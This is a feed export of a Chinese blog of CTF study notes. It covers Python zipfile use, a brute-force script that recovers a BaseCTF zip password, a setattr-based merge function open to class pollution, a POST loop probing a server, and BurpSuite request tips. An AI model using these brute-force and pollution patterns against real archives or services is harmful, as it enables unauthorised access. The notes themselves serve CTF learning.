{
    "version": "https://jsonfeed.org/version/1",
    "title": "花月書架",
    "subtitle": "",
    "icon": "https://ly1tnt.github.io/assets/favicon.ico",
    "description": "",
    "home_page_url": "https://ly1tnt.github.io",
    "items": [
        {
            "id": "https://ly1tnt.github.io/2025/01/06/Python/Python/",
            "url": "https://ly1tnt.github.io/2025/01/06/Python/Python/",
            "title": "WireShark使用",
            "date_published": "2025-01-06T12:18:48.713Z",
            "content_html": "<h1 id=\"python\"><a class=\"anchor\" href=\"#python\">#</a> Python</h1>\n<h3 id=\"1ziperfile模块\"><a class=\"anchor\" href=\"#1ziperfile模块\">#</a> 1.Ziperfile 模块</h3>\n<p>zipfile.ZIP_DEFLATED 压缩减少空间</p>\n<p>zipfile.ZipFile(file[, mode[, compression[, allowZip64]]])</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> zipfile</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># #创建压缩包</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># zf = zipfile.ZipFile(\"yasuoceshi.zip\",\"w\",zipfile.ZIP_DEFLATED)</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>zf <span class=\"token operator\">=</span> zipfile<span class=\"token punctuation\">.</span>ZipFile<span class=\"token punctuation\">(</span><span class=\"token string\">\"ceshi111.zip\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"w\"</span><span class=\"token punctuation\">,</span>  zipfile<span class=\"token punctuation\">.</span>ZIP_DEFLATED<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#写入文件，可以一次性将多个文件压缩，打包</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>write<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> filename<span class=\"token punctuation\">,</span> arcname<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> compress_type<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span>将指定文件写入ZIP文档中</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#参数 filename: 需要写入文件的路径</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#参数 arcname: 文件写入 ZIP 文档后保存的文件名</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#参数 compress_type: 压缩方法 (ZIP_STORED 或 ZIP_DEFAULED)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token triple-quoted-string string\">'''write(路径,别名)'''</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>zf<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/bash\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"bash\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>zf<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/bunzip2\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"bunzip2\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>zf<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/cat\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"tmp/cat\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">#关闭文件</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>zf<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> zipfile</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>zfile<span class=\"token operator\">=</span>zipfile<span class=\"token punctuation\">.</span>ZipFile<span class=\"token punctuation\">(</span><span class=\"token string\">\"1.zip\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">33</span><span class=\"token punctuation\">,</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">33</span><span class=\"token punctuation\">,</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">for</span> k <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">33</span><span class=\"token punctuation\">,</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            mask<span class=\"token operator\">=</span><span class=\"token string\">\"BaseCTF\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\"FTCesaB\"</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>                zfile<span class=\"token punctuation\">.</span>extractall<span class=\"token punctuation\">(</span>pwd<span class=\"token operator\">=</span>mask<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>mask<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">#BaseCTF_h11h_FTCesaB</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token triple-quoted-string string\">\"\"\"extract(文件,路径)\"\"\"</span></pre></td></tr></table></figure><p>使用以上的代码，可以实现对密码的爆破。</p>\n<p><em><strong>&lt;u&gt; 使用 Ziperfile 模块的时候，出现的问题:&lt;/u&gt;</strong></em></p>\n<p>NotImplementedError: That compression method is not supported</p>\n<p><strong>原因分析：</strong></p>\n<p>当您使用例如 7zip 创建 zip 文件时，此 zip 文件将被加密。<br />\n但是加密不是以字节为单位的，而是在哈希中加密的：AES-256 或 ZipCrypto。</p>\n<p><strong>解决方案:</strong></p>\n<p>导入 pyzipper 模块进行解压</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>extracted_zip<span class=\"token punctuation\">.</span>extractall<span class=\"token punctuation\">(</span>pwd<span class=\"token operator\">=</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span>password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"2intab\"><a class=\"anchor\" href=\"#2intab\">#</a> 2.int(a,b)</h3>\n<p>将 a 以 b 进制的形式转化为十进制整数。</p>\n<h3 id=\"\"><a class=\"anchor\" href=\"#\">#</a> </h3>\n<h3 id=\"3hasattr-函数\"><a class=\"anchor\" href=\"#3hasattr-函数\">#</a> 3.hasattr () 函数</h3>\n<p><strong>hasattr()</strong> 函数用于判断对象是否包含对应的属性</p>\n<pre><code>hasattr(object, name)\n</code></pre>\n<ul>\n<li>object -- 对象。</li>\n<li>name -- 字符串，属性名。</li>\n</ul>\n<h2 id=\"返回值\"><a class=\"anchor\" href=\"#返回值\">#</a> 返回值</h2>\n<p>如果对象有该属性返回 True，否则返回 False。</p>\n<h3 id=\"4getattr-函数\"><a class=\"anchor\" href=\"#4getattr-函数\">#</a> 4.getattr () 函数</h3>\n<pre><code>getattr(object, name[, default])\n</code></pre>\n<p>object -- 对象。</p>\n<p>name -- 字符串，对象属性。</p>\n<p>default -- 默认返回值，如果不提供该参数，在没有对应属性时，将触发 AttributeError。</p>\n<h3 id=\"5setattr-函数\"><a class=\"anchor\" href=\"#5setattr-函数\">#</a> 5.setattr () 函数</h3>\n<pre><code>setattr(object, name, value)\n</code></pre>\n<ul>\n<li>object -- 对象。</li>\n<li>name -- 字符串，对象属性。</li>\n<li>value -- 属性值。</li>\n</ul>\n<h3 id=\"6merge函数\"><a class=\"anchor\" href=\"#6merge函数\">#</a> 6.merge 函数</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">merge</span><span class=\"token punctuation\">(</span>src<span class=\"token punctuation\">,</span> dst<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">for</span> k<span class=\"token punctuation\">,</span> v <span class=\"token keyword\">in</span> src<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token builtin\">hasattr</span><span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">,</span> <span class=\"token string\">'__getitem__'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token keyword\">if</span> dst<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                merge<span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">,</span> dst<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                dst<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">elif</span> <span class=\"token builtin\">hasattr</span><span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token comment\">#如果目标字典不支持索引操作（如是一个对象），但 dst 具有与 k 相同的属性，则检查该属性的值是否为字典。如果是，则递归调用 merge 函数，合并源字典中的值与目标对象中的相应属性。</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            merge<span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">,</span> <span class=\"token builtin\">getattr</span><span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token builtin\">setattr</span><span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"7用python编写程序发送post到服务器\"><a class=\"anchor\" href=\"#7用python编写程序发送post到服务器\">#</a> 7. 用 python 编写程序发送 POST 到服务器</h3>\n<p>简单的脚本爆破写法</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">\"xxx\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>max_len<span class=\"token operator\">=</span><span class=\"token number\">100</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">for</span> len_size <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>max_len<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tdata <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>len_size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\tdata<span class=\"token punctuation\">[</span><span class=\"token string-interpolation\"><span class=\"token string\">f'len[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">]'</span></span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'fffffilm'</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\tresponse <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"尝试长度: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>len_size<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">, 服务器响应: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"8main\"><a class=\"anchor\" href=\"#8main\">#</a> 8.<strong>main</strong></h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    app<span class=\"token punctuation\">.</span>debug <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    app<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><em>当.py 文件被直接运行时，if name == ‘main‘之下的代码块将被运行；当.py 文件以模块形式被导入时，if name == ‘main‘之下的代码块不被运行。</em></p>\n<h3 id=\"-2\"><a class=\"anchor\" href=\"#-2\">#</a> </h3>\n<h3 id=\"9if-else特殊写法\"><a class=\"anchor\" href=\"#9if-else特殊写法\">#</a> 9.if else 特殊写法</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>shift <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>char<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> key<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">26</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> char<span class=\"token punctuation\">.</span>islower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>char<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'A'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> key<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">26</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'A'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>这里 if char.islower () 为真，则执行前面，否则执行后面。</p>\n<h3 id=\"10python中的\"><a class=\"anchor\" href=\"#10python中的\">#</a> 10.python 中的 ^</h3>\n<p>^ 为异或，计算优先级最低。</p>\n<h3 id=\"11startswith-和-endswith-方法\"><a class=\"anchor\" href=\"#11startswith-和-endswith-方法\">#</a> 11.startswith 和 endswith 方法</h3>\n<p><code>startswith</code>  和  <code>endswith</code>  是字符串（ <code>str</code> ）对象的内置方法，用于检查字符串的前缀和后缀。</p>\n<p><strong> <code>startswith(prefix)</code> </strong>：检查字符串是否以指定的前缀开始。</p>\n<p><strong> <code>endswith(suffix)</code> </strong>：检查字符串是否以指定的后缀结束。</p>\n<h3 id=\"12itertoolsproduct\"><a class=\"anchor\" href=\"#12itertoolsproduct\">#</a> 12.itertools.product</h3>\n<p>计算输入可迭代对象的笛卡尔积</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> itertools</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 计算两个列表的笛卡尔积</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>result <span class=\"token operator\">=</span> itertools<span class=\"token punctuation\">.</span>product<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'A'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'B'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">for</span> item <span class=\"token keyword\">in</span> result<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># 输出:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># (1, 'A')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># (1, 'B')</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># (2, 'A')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># (2, 'B')</span></pre></td></tr></table></figure><h3 id=\"13bs4模块\"><a class=\"anchor\" href=\"#13bs4模块\">#</a> 13.bs4 模块</h3>\n<p>BeautifulSoup, 从网页中抓取数据</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> bs4 <span class=\"token keyword\">import</span> BeautifulSoup</pre></td></tr></table></figure><p>用 requests 打开一个网址</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">\"https://www.baidu.com\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>r1 <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span><span class=\"token string\">'lxml'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>r1<span class=\"token punctuation\">.</span>encoding<span class=\"token operator\">=</span><span class=\"token string\">'utf-8'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#print (r1.text)</span></pre></td></tr></table></figure><p>创建一个 BeautifulSoup 对象</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>bs_1<span class=\"token operator\">=</span>BeautifulSoup<span class=\"token punctuation\">(</span>r1<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">,</span><span class=\"token string\">'lxml'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#print(bs_1)</span></pre></td></tr></table></figure><table>\n<thead>\n<tr>\n<th><strong>解析器</strong></th>\n<th><strong>使用方法</strong></th>\n<th><strong>优势</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>python 标准库</strong></td>\n<td><code>BeautifulSoup(html, &quot;html.parser&quot;)</code></td>\n<td>1. Python 的内置标准库 &lt;br&gt;2. 执行速度适中 &lt; br&gt;3. 文档容错能力强</td>\n</tr>\n<tr>\n<td><strong>lxml HTML</strong></td>\n<td><code>BeautifulSoup(html, &quot;lxml&quot;)</code></td>\n<td>1. 速度快 &lt;br&gt;2. 文档容错能力强</td>\n</tr>\n<tr>\n<td><strong>lxml XML</strong></td>\n<td><code>BeautifulSoup(html, [&quot;lxml&quot;, &quot;xml&quot;])</code> &lt;br&gt; <code>BeautifulSoup(html, &quot;xml&quot;)</code></td>\n<td>1. 速度快 &lt;br&gt;2. 唯一支持 XML 的解析器</td>\n</tr>\n<tr>\n<td><strong>html5lib</strong></td>\n<td><code>BeautifulSoup(html, &quot;html5lib&quot;)</code></td>\n<td>1. 最好的容错性 &lt;br&gt;2. 以浏览器的方式解析文档 &lt; br&gt;3. 生成 HTML5 的文档</td>\n</tr>\n</tbody>\n</table>\n<p><strong>然后通过这个对象来实现对获取到的源码进行筛选和处理</strong></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>bs_1<span class=\"token punctuation\">.</span>prettify<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#格式化输出全部内容</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>bs_1<span class=\"token punctuation\">.</span>标签名<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#标签名有 html,head,title,meta,body,script,style 等等</span></pre></td></tr></table></figure><p>#标签名有 html,head,title,meta,body,script,style 等等</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>text_element <span class=\"token operator\">=</span> soup<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span><span class=\"token string\">'p'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">id</span><span class=\"token operator\">=</span><span class=\"token string\">'text'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>bs_1<span class=\"token punctuation\">.</span>prettify<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#格式化输出全部内容</span></pre></td></tr></table></figure>",
            "tags": [
                "Python"
            ]
        },
        {
            "id": "https://ly1tnt.github.io/2025/01/06/CTF/Web/BurpSuite/",
            "url": "https://ly1tnt.github.io/2025/01/06/CTF/Web/BurpSuite/",
            "title": "BurpSuite",
            "date_published": "2025-01-06T12:18:48.648Z",
            "content_html": "<h1 id=\"burpsuite\"><a class=\"anchor\" href=\"#burpsuite\">#</a> BurpSuite</h1>\n<p>若要使用 BurpSuite 发送 POST 请求</p>\n<p>则改 GET /login HTTP/1.1 为 POST /login HTTP/1.1</p>\n<p>并加上 Content-Type: application/<strong>x-www-form-urlencoded</strong></p>\n<p>若是发送 JSON 格式，则改为 Content-Type: application/json</p>\n<p>{</p>\n<p>&quot;username&quot;: &quot;your_username&quot;,</p>\n<p>&quot;password&quot;: &quot;your_password&quot;</p>\n<p>}</p>\n<p>注意键值双引号</p>\n<table>\n<thead>\n<tr>\n<th>Content-Type</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>application/x-www-form-urlencoded</td>\n<td>和 GET 查询字段的写法一样，开头不需要  <code>?</code> ，用  <code>&amp;</code>  符号连接各查询参数，遇到特殊字符需要进行转义。</td>\n</tr>\n<tr>\n<td>application/json</td>\n<td>Body 给出一个 JSON 格式的数据，服务端会解析它。</td>\n</tr>\n<tr>\n<td>multipart/form-data</td>\n<td>表单字段，一般用于有文件等复杂类型的场景。</td>\n</tr>\n</tbody>\n</table>\n",
            "tags": [
                "CTF",
                "Web"
            ]
        },
        {
            "id": "https://ly1tnt.github.io/2025/01/06/CTF/Crypto/Crypto/",
            "url": "https://ly1tnt.github.io/2025/01/06/CTF/Crypto/Crypto/",
            "title": "Crypto",
            "date_published": "2025-01-06T12:18:48.612Z",
